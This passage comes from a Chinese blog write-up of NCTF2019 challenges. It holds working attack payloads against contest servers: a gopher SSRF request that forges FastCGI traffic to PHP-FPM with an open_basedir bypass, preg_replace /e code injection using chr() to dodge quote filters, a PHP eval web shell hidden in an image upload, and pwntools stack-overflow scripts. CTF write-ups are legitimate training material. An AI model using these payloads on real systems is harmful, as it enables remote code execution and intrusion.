</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>替换成</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>gopher://173.236.149.10:9000/_%01%01%005%00%08%00%00%00%01%00%00%00%00%00%00%01%04%005%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%005%00%00%00%00%01%05%005%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%005%00%00%00%00
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>可以看到有<code>open_basedir	/var/www/html:/tmp</code></p> <p>用一个经典的绕过方式</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>mkdir('eki');chdir('eki');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code>python gopher.srff.exp.py <span class="token parameter variable">-c</span> <span class="token string">&quot;&lt;?php mkdir('eki');chdir('eki');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));?&gt;&quot;</span> <span class="token number">173.236</span>.149.10 /var/www/html/index.php

gopher://127.0.0.1:9000/_%01%01z%BF%00%08%00%00%00%01%00%00%00%00%00%00%01%04z%BF%01%DC%00%00%0E%03CONTENT_LENGTH171%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04z%BF%00%00%00%00%01%05z%BF%00%AB%00%00%3C%3Fphp%20mkdir%28%27eki%27%29%3Bchdir%28%27eki%27%29%3Bini_set%28%27open_basedir%27%2C%27<span class="token punctuation">..</span>%27%29%3Bchdir%28%27<span class="token punctuation">..</span>%27%29%3Bchdir%28%27<span class="token punctuation">..</span>%27%29%3Bchdir%28%27<span class="token punctuation">..</span>%27%29%3Bchdir%28%27<span class="token punctuation">..</span>%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%3F%3E%01%05z%BF%00%00%00%00`
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_0x05-easyphp"><a href="#_0x05-easyphp" class="header-anchor">#</a> 0x05 easyphp</h2> <p>大佬队友带我躺赢。。。。。</p> <h2 id="_0x06-replace"><a href="#_0x06-replace" class="header-anchor">#</a> 0x06 replace</h2> <p>填三个&quot;#&quot;报错</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1

Fatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>实现功能使用的是preg_match()</p> <p>题目提示用了php5.6</p> <p>想到preg_match() /e参数</p> <p>试一下可以执行phpinfo()</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /index.php HTTP/1.1
Host: nctf2019.x1ct34m.com:40006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Origin: http://nctf2019.x1ct34m.com:40006
Connection: close
Referer: http://nctf2019.x1ct34m.com:40006/index.php
Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g
Upgrade-Insecure-Requests: 1

sub=text&amp;pat=e&amp;rep=phpinfo();
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>但是直接用readfile('/flag')读文件，发现单引号双引号被拦截</p> <p>于是用chr()拼接表示字符串。。。。。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /index.php HTTP/1.1
Host: nctf2019.x1ct34m.com:40006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Origin: http://nctf2019.x1ct34m.com:40006
Connection: close
Referer: http://nctf2019.x1ct34m.com:40006/index.php
Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g
Upgrade-Insecure-Requests: 1

sub=text&amp;pat=e&amp;rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103));
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h2 id="_0x07-flask"><a href="#_0x07-flask" class="header-anchor">#</a> 0x07 flask</h2> <p>大佬队员，躺赢。。。。。</p> <h2 id="_0x08-upload-your-shell"><a href="#_0x08-upload-your-shell" class="header-anchor">#</a> 0x08 Upload your Shell</h2> <p>翻了一下网页就只有</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>index.php?action=imgs.html
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>有注入点
然后想着上传一个图片马
直接写一句话改后缀名不行
看起来他是要读文件头的
并且拦截了&lt;?（有时候正常的图片文件都会有。。。。。）
考虑php的第三种写法</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;script language=&quot;php&quot;&gt; 
@eval($_POST[a]);
&lt;/script&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>刚准备用菜刀的结果告诉我一个服务器上自带的图片马的地址
用自带的action参数解析成php就完事了
payload:</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>/index.php?action=/var/www/html/upload-imgs/321fab94ed3f1e1fba698ddda303566a/Th1s_is_a_fl4g.jpg
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_0x09-flask-website"><a href="#_0x09-flask-website" class="header-anchor">#</a> 0x09 flask_website</h2> <p>大佬队友带我躺赢。。。。。</p> <h2 id="_0x0a-simple-xss"><a href="#_0x0a-simple-xss" class="header-anchor">#</a> 0x0A simple_xss</h2> <p>据队友说是个入门向xss</p> <p>在http://xsspt.com/生成一段xss 发给admin</p> <p>过一会就会得到admin的cookie</p> <p>然后就能拿到flag......</p> <h2 id="_0x0b-hacker-backdoor"><a href="#_0x0b-hacker-backdoor" class="header-anchor">#</a> 0x0B hacker_backdoor</h2> <p>大佬队友带我躺赢。。。。。+2</p> <h2 id="_0x0c-tsb"><a href="#_0x0c-tsb" class="header-anchor">#</a> 0x0C tsb</h2> <p>tsb-&gt;bst .....</p> <h2 id="_0x0d-难看的代码"><a href="#_0x0d-难看的代码" class="header-anchor">#</a> 0x0D 难看的代码</h2> <p>大佬队友带我躺赢。。。。。+3</p> <h2 id="_0x0e-签到题"><a href="#_0x0e-签到题" class="header-anchor">#</a> 0x0E 签到题</h2> <p>大佬队友带我躺赢。。。。。+4</p> <h2 id="_0x0f-debug"><a href="#_0x0f-debug" class="header-anchor">#</a> 0x0F DEBUG</h2> <p>真就IDA 动态调试。。。。。</p> <p>因为</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>  for ( i = 0; i &lt;= 23; ++i )
  {
    if ( v7[i] != *(&amp;s + i) )
    {
      printf(&quot;GG&quot;);
      exit(0);
    }
  }
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>进循环时s就计算好了</p> <p>然后下个断点直接看栈就好了</p> <h2 id="_0x10-our-16bit-games"><a href="#_0x10-our-16bit-games" class="header-anchor">#</a> 0x10 Our 16bit Games</h2> <p>大佬队友带我躺赢。。。。。+5</p> <h2 id="_0x11-easy-ternary"><a href="#_0x11-easy-ternary" class="header-anchor">#</a> 0x11 Easy Ternary</h2> <p>大佬队友带我躺赢。。。。。+6</p> <h2 id="_0x12-你大概需要一个带bar的mac"><a href="#_0x12-你大概需要一个带bar的mac" class="header-anchor">#</a> 0x12 你大概需要一个带bar的mac</h2> <p>无设备引起不适。。。</p> <p>过</p> <h2 id="_0x13-math-easy"><a href="#_0x13-math-easy" class="header-anchor">#</a> 0x13 math_easy</h2> <p>math.....easy?...... 过.......</p> <h2 id="_0x14-hello-pwn"><a href="#_0x14-hello-pwn" class="header-anchor">#</a> 0x14 hello_pwn</h2> <p>nc 题。。。。。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>#coding=utf-8
from pwn import *
io=remote(&quot;139.129.76.65&quot;,&quot;50003&quot;)
io.interactive()
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="_0x15-pwn-me-100-years-i"><a href="#_0x15-pwn-me-100-years-i" class="header-anchor">#</a> 0x15 pwn me 100 years! (I)</h2> <p>checksec 看一下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>没开Canary和PIE，</p> <p>要满足两个条件</p> <p>直接栈溢出就完事了</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>#coding=utf-8
from pwn import *
payload=&quot;yes\x00&quot;+'a'*(0x10-0x4)+p64(0x66666666)
io=remote(&quot;139.129.76.65&quot;,&quot;50004&quot;)
io.sendafter(&quot;ready?\n&quot;,payload)
io.interactive()
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="_0x16-pwn-me-100-years-ii"><a href="#_0x16-pwn-me-100-years-ii" class="header-anchor">#</a> 0x16 pwn me 100 years! (II)</h2> <p>漏洞：栈上变量未初始化导致第一个函数里的buf就是第二个函数的&amp;dest</p> <p>然后可以用第二个函数的printf格式化漏洞</p> <p>但是checksec告诉我们</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>开了PIE....</p> <p>还得泄露基址。。</p> <p>最后没能整出来，还是要好好学。。。。。</p> <h2 id="_0x17-0x1c-pwn"><a href="#_0x17-0x1c-pwn" class="header-anchor">#</a> 0x17 ~ 0x1C(pwn)</h2> <p>0x17没做出来，心态爆炸。。。。。</p> <h2 id="_0x1d-keyboard"><a href="#_0x1d-keyboard" class="header-anchor">#</a> 0x1D Keyboard</h2> <p>九宫格输入法。。。。。。</p> <p>好像把所有不一样的表示换成不同字幕跑quipquip也能过。。。。。</p> <h2 id="_0x1e-0x21-crypto"><a href="#_0x1e-0x21-crypto" class="header-anchor">#</a> 0x1E~0x21 (Crypto)</h2> <p>我，数学学术垃圾，过.......</p> <h2 id="_0x22-a-good-idea"><a href="#_0x22-a-good-idea" class="header-anchor">#</a> 0x22 a_good_idea</h2> <p>foremost+stegsolve(image Combiner)</p> <p>得到一张二维码，扫描得到flag</p> <h2 id="_0x23-become-a-rockstar"><a href="#_0x23-become-a-rockstar" class="header-anchor">#</a> 0x23 Become a Rockstar</h2> <p>看文风有点奇怪。。。。像是编程语言。。。</p> <p>搜了一下有没有诗歌一样的编程语言</p> <p>发现Rockstar语言</p> <p>用Rockstar-js 没跑出来暂时放弃了</p> <p>结果Rockstar-py可以跑出来</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>Leonard_Adleman <span class="token operator">=</span> <span class="token string">&quot;star&quot;</span>
Problem_Makers <span class="token operator">=</span> <span class="token number">76</span>
Problem_Makers <span class="token operator">=</span> <span class="token string">&quot;NCTF{&quot;</span>
<span class="token keyword">def</span> <span class="token function">God</span><span class="token punctuation">(</span>World<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a_boy <span class="token operator">=</span> <span class="token string">&quot;flag&quot;</span>
    the_boy <span class="token operator">=</span> <span class="token number">3</span>
<span class="token keyword">def</span> <span class="token function">Evil</span><span class="token punctuation">(</span>your_mind<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a_girl <span class="token operator">=</span> <span class="token string">&quot;no flag&quot;</span>
    the_girl <span class="token operator">=</span> <span class="token number">5</span>
Truths <span class="token operator">=</span> <span class="token number">3694</span>
Bob <span class="token operator">=</span> <span class="token string">&quot;ar&quot;</span>
Adi_Shamir <span class="token operator">=</span> <span class="token string">&quot;rock&quot;</span>
<span class="token keyword">def</span> <span class="token function">Love</span><span class="token punctuation">(</span>Alice<span class="token punctuation">,</span> Bob<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Mallory <span class="token operator">=</span> <span class="token number">13</span>
    Mallory <span class="token operator">=</span> <span class="token number">24</span>
Everything <span class="token operator">=</span> <span class="token number">114514</span>
Alice <span class="token operator">=</span> <span class="token string">&quot;you&quot;</span>
<span class="token keyword">def</span> <span class="token function">Reality</span><span class="token punctuation">(</span>God<span class="token punctuation">,</span> Evil<span class="token punctuation">)</span><span class="token punctuation">:</span>
    God <span class="token operator">=</span> <span class="token number">26</span>
    Evil <span class="token operator">=</span> <span class="token number">235</span>
Ron_Rivest <span class="token operator">=</span> <span class="token string">&quot;nice&quot;</span>
<span class="token keyword">def</span> <span class="token function">You_Want_To</span><span class="token punctuation">(</span>Alice<span class="token punctuation">,</span> Love<span class="token punctuation">,</span> Anything<span class="token punctuation">)</span><span class="token punctuation">:</span>
    You <span class="token operator">=</span> <span class="token number">5.75428</span>
your_heart <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
You <span class="token operator">=</span> <span class="token number">5</span>
your_mind <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
Nothing <span class="token operator">=</span> <span class="token number">31</span>
<span class="token keyword">if</span> Truths <span class="token operator">*</span> Nothing <span class="token operator">==</span> Everything<span class="token punctuation">:</span>
    RSA <span class="token operator">=</span> Ron_Rivest <span class="token operator">+</span> Adi_Shamir <span class="token operator">+</span> Leonard_Adleman
<span class="token keyword">if</span> Everything <span class="token operator">/</span> Nothing <span class="token operator">==</span> Truths<span class="token punctuation">:</span>
    Problem_Makers <span class="token operator">=</span> Problem_Makers <span class="token operator">+</span> Alice <span class="token operator">+</span> Bob
<span class="token keyword">print</span><span class="token punctuation">(</span>Problem_Makers<span class="token punctuation">)</span>
the_flag <span class="token operator">=</span> <span class="token number">245</span>
the_confusion <span class="token operator">=</span> <span class="token number">244</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
Mysterious_One <span class="token operator">=</span> <span class="token string">&quot;}&quot;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>Mysterious_One<span class="token punctuation">)</span>
This <span class="token operator">=</span> <span class="token number">4</span>
This <span class="token operator">=</span> <span class="token number">35</span>
This <span class="token operator">=</span> <span class="token number">7</span>
This <span class="token operator">=</span> <span class="token number">3</span>
This <span class="token operator">=</span> <span class="token number">3</span>
This <span class="token operator">=</span> <span class="token number">37</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><h2 id="_0x24-bright-body-i"><a href="#_0x24-bright-body-i" class="header-anchor">#</a> 0x24 Bright Body I</h2> <p>虚幻引擎好游戏啊！（然而手残。。。。。</p> <p>巅峰极客Nijia留下的心理阴影</p> <p>以为要用逆向代码啥的</p> <p>结果最后是在pak里直接strings就能出来的题目。。。。。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>strings /mnt/c/Users/Eki/Desktop/Bright\ Body\ I/Bright\ Body\ I/Magic/Content/Paks/Magic-WindowsNoEditor.pak |grep NCTF*
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_0x25-有内鬼-终止交易"><a href="#_0x25-有内鬼-终止交易" class="header-anchor">#</a> 0x25 有内鬼,终止交易</h2> <p>一个ss协议流量分析题</p> <blockquote><p>一、针对wireshark最常用的自然是针对IP地址的过滤。其中有几种情况：</p> <p>表达式为：ip.src == 192.168.0.1</p> <p>（2）对目的地址为192.168.0.1的包的过滤，即抓取目的地址满足要求的包。</p> <p>表达式为：ip.dst == 192.168.0.1</p> <p>（3）对源或者目的地址为192.168.0.1的包的过滤，即抓取满足源或者目的地址的ip地址是192.168.0.1的包。</p> <p>表达式为：ip.addr == 192.168.0.1,或者 ip.src == 192.168.0.1 or ip.dst == 192.168.0.1</p> <p>（4）要排除以上的数据包，我们只需要将其用括号囊括，然后使用 &quot;!&quot; 即可。</p> <p>表达式为：!(表达式)</p> <p>二、针对协议的过滤</p> <p>（1）仅仅需要捕获某种协议的数据包，表达式很简单仅仅需要把协议的名字输入即可。</p> <p>​         表达式为：http</p> <p>（2）需要捕获多种协议的数据包，也只需对协议进行逻辑组合即可。</p> <p>表达式为：http or telnet （多种协议加上逻辑符号的组合即可）</p> <p>（3）排除某种协议的数据包</p> <p>表达式为：not arp    !tcp</p> <p>三、针对端口的过滤（视协议而定）</p> <p>（1）捕获某一端口的数据包</p> <p>表达式为：tcp.port == 80</p> <p>（2）捕获多端口的数据包，可以使用and来连接，下面是捕获高端口的表达式</p> <p>表达式为：udp.port &gt;= 2048</p> <p>四、针对长度和内容的过滤</p> <p>（1）针对长度的过虑（这里的长度指定的是数据段的长度）</p> <p>表达式为：udp.length &lt; 30  http.content_length &lt;=20</p> <p>（2）针对数据包内容的过滤</p> <p>表达式为：http.request.uri matches &quot;vipscu&quot;  （匹配http请求中含有vipscu字段的请求信息）</p></blockquote> <p>config.json泄露了加密方法、密钥和主机地址</p> <p>用ss的源码里的脚本直接跑解密</p> <p>人肉分析了半个下午，心态爆炸。。。。。</p> <p>分析不出来，</p> <blockquote><p>由于客户端和服务端发送包都经过了加密，不能整个导出进行解密，需分开解密</p></blockquote> <p>......</p> <p>最后找到是在这个TCP包里。。。</p> <h2 id="_0x26-小狗的秘密"><a href="#_0x26-小狗的秘密" class="header-anchor">#</a> 0x26 小狗的秘密</h2> <p>流量分析套路题</p> <p>用Wireshark导出HTTP对象</p> <p>最大的一个1.html里有很奇妙的东西类似</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>(255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255).....
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>盲猜是RGB像素点，把格式改一下用下面的脚本导出图像</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>#coding=utf-8
from PIL import Image

x = 500    #x坐标  通过对txt里的行数进行整数分
y = 100    #y坐标  x * y = 行数

im = Image.new(&quot;RGB&quot;, (x, y))
file = open('1.html')

for i in range(0, x):
    for j in range(0, y):
        line = file.readline()  #获取一行的rgb值
        rgb = line.split(&quot;, &quot;)  #分离rgb，文本中逗号后面有空格
        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))

im.save('flag.jpg')
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h2 id="_0x27-键盘侠"><a href="#_0x27-键盘侠" class="header-anchor">#</a> 0x27 键盘侠</h2> <p>下载一个zip伪加密</p> <p>里面一张大的不科学的图</p> <p>直接上foremost</p> <p>得到一个docx</p> <p>说是隐藏字符</p> <p>打开docx隐藏字符显示</p> <p>得到这么一串东西</p> <p>PD4~idqQC|WjHloX&gt;)UPb8~ZFb8laGczAeteE</p> <p>想了很久。。</p> <p>甚至打开xml发现密文分三段。。。还有个hint:eastAsia</p> <p>以为是某种多表代换？</p> <p>最后也没做出来</p> <p>结果最后告诉我是个base85..........</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>python3
&gt;&gt;&gt; import base64
&gt;&gt;&gt; base64.b85decode('PD4~idqQC|WjHloX&gt;)UPb8~ZFb8laGczAeteE')
b'NCTF{Ba3e85_issssss_so_xxxxx}'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="_0x28-what-s-this"><a href="#_0x28-what-s-this" class="header-anchor">#</a> 0x28 What's this</h2> <p>WireShark找到大文件点导出字节流存储为zip</p> <p>发现还是个伪加密</p> <p>里面一堆base64</p> <p>多行的解不出来，应该就是base64隐写了</p> <p>跑一下脚本就得到flag....</p> <p>(一开始可能复制错了结果没跑出来。。。。。)</p> <h2 id="_0x29-2077"><a href="#_0x29-2077" class="header-anchor">#</a> 0x29 2077</h2> <p>点开一看发现是2077的“官方”解密视频</p> <p>应该会有大佬解过</p> <p>所以Google Cyberpunk 2077 stream decode.</p> <p>然后找到一个帖子 https://www.reddit.com/r/pcgaming/comments/9an6mn/cd_projekt_red_twitch_live_with_cyberpunk_2077/ ，解密结果是一张图</p> <p>下载后用 sha256sum 命令求 sha256 值即可。</p> <h2 id="_0x2a-pip-install"><a href="#_0x2a-pip-install" class="header-anchor">#</a> 0x2A pip install</h2> <p>直接把pip 下下来的包拿来分析</p> <p>里面有一串神奇的编码。。。。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>tmp_file <span class="token operator">=</span> tempfile<span class="token punctuation">.</span>gettempdir<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> path<span class="token punctuation">.</span>sep <span class="token operator">+</span> <span class="token string">'.f14g_is_here'</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>tmp_file<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>用base64就能解码出来</p></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/EkiXu/blog/edit/master/docs/_posts/contest/04.nctf2019.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2022/05/18, 16:49:51</span></div></div> <div class="page-nav-wapper"><!----> <!----></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/qwb2022final/"><div>
            QWB CTF2022 线下赛总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/ciscn2022final/"><div>
            CISCN2022 总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/dsctf2022_final/"><div>
            DSCTF2022决赛 部分writeup
